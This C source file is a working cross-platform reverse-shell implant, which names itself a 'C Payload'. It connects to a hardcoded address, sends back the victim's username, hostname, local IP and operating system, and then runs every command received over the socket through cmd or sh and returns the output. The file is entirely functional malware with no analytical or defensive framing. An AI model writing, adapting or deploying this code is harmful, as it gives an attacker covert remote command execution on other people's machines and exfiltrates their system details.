#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <unistd.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#endif

#define BUFFER_SIZE 4096

const char *target = "192.168.1.7:1234";

void get_username(char *buffer, size_t size) {
#ifdef _WIN32
    DWORD len = size;
    GetUserNameA(buffer, &len);
#else
    char *user = getenv("USER");
    strncpy(buffer, user ? user : "N/A", size);
#endif
}

void get_hostname(char *buffer, size_t size) {
#ifdef _WIN32
    DWORD len = size;
    GetComputerNameA(buffer, &len);
#else
    gethostname(buffer, size);
#endif
}

void get_local_ip(char *ip_buffer, size_t size) {
    struct sockaddr_in serv;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock == -1) {
        strncpy(ip_buffer, "N/A", size);
        return;
    }

    memset(&serv, 0, sizeof(serv));
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = inet_addr("8.8.8.8");
    serv.sin_port = htons(53);

    connect(sock, (const struct sockaddr *)&serv, sizeof(serv));

    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    getsockname(sock, (struct sockaddr *)&name, &namelen);

    strncpy(ip_buffer, inet_ntoa(name.sin_addr), size);
#ifdef _WIN32
    closesocket(sock);
#else
    close(sock);
#endif
}

void send_metadata(int sockfd) {
    char username[128] = {0};
    char hostname[128] = {0};
    char ip[64] = {0};

    get_username(username, sizeof(username));
    get_hostname(hostname, sizeof(hostname));
    get_local_ip(ip, sizeof(ip));

#ifdef _WIN32
    const char *os = "windows";
#else
    const char *os = "linux";
#endif

    char message[512];
    snprintf(message, sizeof(message),
        "[+] C Payload:\n\t- Username: %s\n\t- Hostname: %s\n\t- LocalIP: %s\n\t- OS: %s\n\n",
        username, hostname, ip, os);

    send(sockfd, message, strlen(message), 0);
}

// Function to handle the METADATA command request
void handle_metadata_request(int sockfd) {
    char username[128] = {0};
    char hostname[128] = {0};
    
    get_username(username, sizeof(username));
    get_hostname(hostname, sizeof(hostname));
    
#ifdef _WIN32
    const char *os = "windows";
#else
    const char *os = "linux";
#endif

    char metadata[256];
    snprintf(metadata, sizeof(metadata), "%s|%s|%s\n", username, hostname, os);
    
    send(sockfd, metadata, strlen(metadata), 0);
}

void execute_command(int sockfd, const char *command) {
    // Check if it's a metadata request
    if (strcmp(command, "METADATA") == 0) {
        handle_metadata_request(sockfd);
        return;
    }
    
    // Skip empty commands
    if (strlen(command) == 0) {
        return;
    }

    char buffer[BUFFER_SIZE];
    FILE *fp;
    int output_sent = 0;

#ifdef _WIN32
    char full_command[BUFFER_SIZE];
    snprintf(full_command, sizeof(full_command), "cmd /C %s", command);
#else
    char full_command[BUFFER_SIZE];
    snprintf(full_command, sizeof(full_command), "sh -c '%s'", command);
#endif

    fp = popen(full_command, "r");
    if (fp == NULL) {
        const char *err = "[Error] Failed to execute command\n";
        send(sockfd, err, strlen(err), 0);
        output_sent = 1;
    } else {
        while (fgets(buffer, sizeof(buffer), fp) != NULL) {
            send(sockfd, buffer, strlen(buffer), 0);
            output_sent = 1;
        }
        pclose(fp);
    }

    // If no output was sent, inform the client
    if (!output_sent) {
        const char *no_output = "Command executed with no output\n";
        send(sockfd, no_output, strlen(no_output), 0);
    }

    // Send end-of-command marker
    const char *end_marker = "--END--\n";
    send(sockfd, end_marker, strlen(end_marker), 0);
}

int main() {
#ifdef _WIN32
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);
#endif

    char ip[128] = {0};
    int port = 0;
    sscanf(target, "%127[^:]:%d", ip, &port);

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return 1;

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip);

    if (connect(sockfd, (struct sockaddr *)&server, sizeof(server)) < 0) {
        return 1;
    }

    send_metadata(sockfd);

    char command[BUFFER_SIZE];
    while (1) {
        memset(command, 0, sizeof(command));
        int recv_size = recv(sockfd, command, sizeof(command) - 1, 0);
        if (recv_size <= 0) break;

        // Remove newline characters
        command[strcspn(command, "\r\n")] = 0;
        
        execute_command(sockfd, command);
    }

#ifdef _WIN32
    closesocket(sockfd);
    WSACleanup();
#else
    close(sockfd);
#endif

    return 0;
}
